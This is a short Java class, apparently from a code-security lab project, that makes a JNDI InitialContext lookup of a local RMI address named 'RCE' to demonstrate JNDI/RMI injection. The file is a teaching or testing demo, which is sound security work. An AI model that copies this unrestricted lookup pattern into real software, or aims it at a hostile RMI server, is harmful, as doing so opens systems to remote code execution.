package com.madaha.codesecone.controller.jndi.RmiEvilTest;

import javax.naming.InitialContext;
import javax.naming.NamingException;

public class RMIClient {
    public static void main(String[] args) throws NamingException {
        try {
            Object ret = new InitialContext().lookup("rmi://127.0.0.1:1099/RCE");
            System.out.println("ret: " + ret);
        } catch (NamingException e) {
            e.printStackTrace();
        }
//        String uri = "rmi://127.0.0.1:1099/RCE";
//        InitialContext initialContext = new InitialContext();
//        initialContext.lookup(uri);
    }
}
